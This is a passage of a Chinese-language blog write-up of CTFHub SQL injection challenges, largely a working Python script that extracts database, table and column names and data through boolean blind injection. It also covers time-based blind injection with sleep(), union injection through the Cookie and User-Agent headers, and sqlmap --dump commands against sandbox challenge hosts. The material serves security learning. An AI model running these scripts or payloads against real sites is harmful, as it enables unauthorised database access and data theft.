class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(table_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表名为&quot;</span>, table)<br>    <span class="hljs-keyword">return</span> table<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column_num</span>(<span class="hljs-params">table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(column_name) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;中有&quot;</span>, num, <span class="hljs-string">&quot;个字段&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column_length</span>(<span class="hljs-params">index, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(column_name) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;个字段的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column</span>(<span class="hljs-params">index, column_length, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    column = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, column_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(column_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                column += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知字段为&quot;</span>, column)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(column_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;个字段名为&quot;</span>, column)<br>    <span class="hljs-keyword">return</span> column<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_num</span>(<span class="hljs-params">column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(&quot;</span> + column + <span class="hljs-string">&quot;) from &quot;</span> + table + <span class="hljs-string">&quot;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;中有&quot;</span>, num, <span class="hljs-string">&quot;行数据&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_length</span>(<span class="hljs-params">index, column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(&quot;</span> + column + <span class="hljs-string">&quot;) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;行数据的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">index, flag_length, column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(&quot;</span> + column + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知flag为&quot;</span>, flag)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(&quot;</span> + column + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;行数据为&quot;</span>, flag)<br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据库名长度&quot;</span>)<br>    database_length = get_database_length()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据库名&quot;</span>)<br>    database = get_database(database_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表的个数&quot;</span>)<br>    table_num = get_table_num(database)<br>    tables = []<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, table_num):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个数据表的名称的长度&quot;</span>)<br>        table_length = get_table_length(i, database)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个数据表的名称&quot;</span>)<br>        table = get_table(i, table_length, database)<br>        tables.append(table)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>): <span class="hljs-comment">#在这个循环中可以进入所有的数据表一探究竟</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了以下数据表&quot;</span>, tables)<br>        table = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请在这些数据表中选择一个目标: &quot;</span>)<br>        <span class="hljs-keyword">while</span>( table <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> tables ):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你输入有误&quot;</span>)<br>            table = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请重新选择一个目标&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择成功，开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的字段数量&quot;</span>)<br>        column_num = get_column_num(table)<br>        columns = []<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, column_num):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个字段名称的长度&quot;</span>)<br>            column_length = get_column_length(i, table)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个字段的名称&quot;</span>)<br>            column = get_column(i, column_length, table)<br>            columns.append(column)<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>): <span class="hljs-comment">#在这个循环中可以获取当前选择数据表的所有字段记录</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了数据表&quot;</span>, table, <span class="hljs-string">&quot;中的以下字段&quot;</span>, columns)<br>            column = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请在这些字段中选择一个目标: &quot;</span>)<br>            <span class="hljs-keyword">while</span>( column <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> columns ):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你输入有误&quot;</span>)<br>                column = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请重新选择一个目标&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择成功，开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的记录数量&quot;</span>)<br>            flag_num = get_flag_num(column, table)<br>            flags = []<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, flag_num):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的&quot;</span>, column, <span class="hljs-string">&quot;字段的第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;行记录的长度&quot;</span>)<br>                flag_length = get_flag_length(i, column, table)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的&quot;</span>, column, <span class="hljs-string">&quot;字段的第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;行记录的内容&quot;</span>)<br>                flag = get_flag(i, flag_length, column, table)<br>                flags.append(flag)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了数据表&quot;</span>, table, <span class="hljs-string">&quot;中&quot;</span>, column, <span class="hljs-string">&quot;字段中的以下记录&quot;</span>, flags)<br>            quit = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;继续切换字段吗？(y/n)&quot;</span>)<br>            <span class="hljs-keyword">if</span> (quit == <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">or</span> quit == <span class="hljs-string">&#x27;N&#x27;</span>):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>        quit = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;继续切换数据表名吗？(y/n)&quot;</span>)<br>        <span class="hljs-keyword">if</span> (quit == <span class="hljs-string">&#x27;n&#x27;</span> <span class="hljs-keyword">or</span> quit == <span class="hljs-string">&#x27;N&#x27;</span>):<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye~&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>先给出github地址。</p><p><a href="https://github.com/wuuconix/SQL-Blind-Injection-Auto">wuuconix/SQL-Blind-Injection-Auto: 自己写的SQL盲注自动化脚本 (github.com)</a></p><p>最后在给出演示视频。</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=462667794&bvid=BV1fL411b7b8&cid=397907709&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div><h3 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注"></a> 时间盲注</h3><p>时间盲注和上一篇布尔盲注一样都是盲注，都需要借助<code>length</code>,<code>ascii</code>,<code>substr</code>这些神奇的函数来猜测各项信息。它们的差别是猜测成功的依据。</p><p>布尔盲注的话如果查询有结果，一般会有一个<code>success_flag</code>,比如在上一题里就会返回<code>query successfully</code>。我的脚本也就是request返回值里有没有这个文本来判断是否查询成功的。</p><p>但是时间盲注不一样，它不光不给你查询的内容的回显，不给你报错信息，甚至连布尔盲注里的<code>success_flag</code>也不给你。也就是什么情况呢？你在那里查询，它什么信息都不给你，也就是所谓的<code>无回显</code>。我以前认为无回显是根本不可能做出来的。但是时间盲注让我打开眼界。</p><p>时间盲注相当于自行创造出了一个<code>success_flag</code>，将查询成功的情况与查询失败的情况做了区分。以此区别作为依据，我们便可以进行猜测，盲注。</p><p>这个区别是这样产生的。主要利用了mysql中的<code>if</code>函数和<code>sleep</code>函数。我们看下面一条语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>, <span class="hljs-number">1</span>, sleep(<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>if函数的第一个参数是一条判断语句，<code>1=1</code>为真，所以if函数会返回第二个参数即<code>1</code>。即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这很显然会正常返回结果。</p><p><img src="https://upyun.wuuconix.link/image-20210828204333158.png" alt="1 and 1" /></p><p>那如果把if的第一个参数改变一下呢？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span>, <span class="hljs-number">1</span>, sleep(<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>第一个参数是false，if函数会返回第二个参数<code>sleep(2)</code>，这会让这个查询语句睡眠两秒，再返回结果。</p><p><img src="https://upyun.wuuconix.link/image-20210828200944498.png" alt="睡眠中" /></p><p>同时由于这个sleep函数本身的返回值是0，即false。</p><p><img src="https://upyun.wuuconix.link/image-20210828201032029.png" alt="mysql中sleep的返回值" /></p><p>故那条语句的结果将会返回空。</p><p><img src="https://upyun.wuuconix.link/image-20210828201131765.png" alt="Empty set" /></p><p>同时我们的脚本还需要对这个睡眠2秒进行识别，因为sql查询语句睡眠了两秒，那么php也会跟着等，整个页面将会进入等待而迟迟不给出相应，我们的request就需要根据相应给出的时间来得到这个<code>success_flag</code>。</p><p>这样即可，在get请求中写一个<code>timeout</code>参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">requests.get(url, headers=headers, timeout=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>如果在1s钟内服务器没有返回信息，那么request就会报错。</p><p><img src="https://upyun.wuuconix.link/image-20210828202748017.png" alt="reqeusts.exceptions.ReadTimeout" /></p><p>然后我们就可以用异常捕捉语句来捕捉这个报错，从而根据有没有报错来判断我们需要判断的信息是否正确。</p><p><img src="https://upyun.wuuconix.link/image-20210828203018185.png" alt="异常捕捉" /></p><p>时间盲注的脚本已经更新到<a href="https://github.com/wuuconix/SQL-Blind-Injection-Auto/blob/main/blind_time_int.py">github</a>，这里就不写了，太长了。</p><p>实际上也就是在昨天脚本的基础上套上了一层if，然后把<code>success_flag</code>换成了异常处理。</p><h3 id="cookie注入"><a class="markdownIt-Anchor" href="#cookie注入"></a> Cookie注入</h3><p>Cookie注入界面一般不会给你输入框，类似这道题目。</p><p><img src="https://upyun.wuuconix.link/image-20210829112805087.png" alt="Cookie注入" /></p><p>它的注入点存在于Cookie之中。这是Burp抓包的结果。</p><p><img src="https://upyun.wuuconix.link/image-20210829112911755.png" alt="Cookie id" /></p><p>那就很简单了，我们还是利用那个强大的插件，Copy as requests，把请求转化为python中的request代码。之后改一下id的值就行。因为这道题是有回显的，所以用最基本的联合注入即可，要是Cookie配合上时间盲注就有意思了2333。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># id = &quot;1 and 1=2 union select database(), 1&quot; #爆库</span><br><span class="hljs-comment"># id = &quot;1 and 1=2 union select group_concat(table_name), 1 from information_schema.tables where table_schema = &#x27;sqli&#x27;&quot; #爆表</span><br><span class="hljs-comment"># id = &quot;1 and 1=2 union select group_concat(column_name), 1 from information_schema.columns where table_name = &#x27;fwtzeovuem&#x27;&quot; #爆字段</span><br><span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and 1=2 union select rzahbuabdf, 1 from fwtzeovuem&quot;</span> <span class="hljs-comment">#get flag</span><br>burp0_url = <span class="hljs-string">&quot;http://challenge-498ee75cbbb367a1.sandbox.ctfhub.com:10800/&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;hint&quot;</span>: <span class="hljs-string">&quot;id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;Cache-Control&quot;</span>: <span class="hljs-string">&quot;max-age=0&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210829113148197.png" alt="flag" /></p><p>因为这道题比较简单，我还试了一下<code>sqlmap</code>。这次总算不是日常<code>坚不可摧</code>了。成功得到了flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-498ee75cbbb367a1.sandbox.ctfhub.com:10800&quot;</span> --cookie <span class="hljs-string">&quot;id=1&quot;</span> --level 2 -D sqli -T fwtzeovuem -C rzahbuabdf --dump<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210829113324069.png" alt="sqlmap" /></p><h3 id="ua注入"><a class="markdownIt-Anchor" href="#ua注入"></a> UA注入</h3><p>UA注入和Cookie类似，只是换了个注入位置。基于的还是最基础的Union注入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>burp0_url = <span class="hljs-string">&quot;http://challenge-c1afe7c2c2a76623.sandbox.ctfhub.com:10800/&quot;</span><br><span class="hljs-comment"># UA = &quot;1 and 1=2 union select 1, database()&quot;</span><br><span class="hljs-comment"># UA = &quot;1 and 1=2 union select 1, group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;&quot;</span><br><span class="hljs-comment"># UA = &quot;1 and 1=2 union select 1, group_concat(column_name) from information_schema.columns where table_name=&#x27;cqomjcukck&#x27;&quot;</span><br>UA = <span class="hljs-string">&quot;1 and 1=2 union select 1, ycrtshvcir from cqomjcukck&quot;</span><br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: UA, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(requests.get(burp0_url, headers=burp0_headers).text)<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210829115147165.png" alt="脚本运行结果" /></p><p><img src="https://upyun.wuuconix.link/image-20210829115211468.png" alt="burp render" /></p><p>照例，还是试了一下sqlmap，我才发现sqlmap原来这么好用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u <span class="hljs-string">&quot;http://challenge-c1afe7c2c2a76623.sandbox.ctfhub.com:10800/&quot;</span> --level 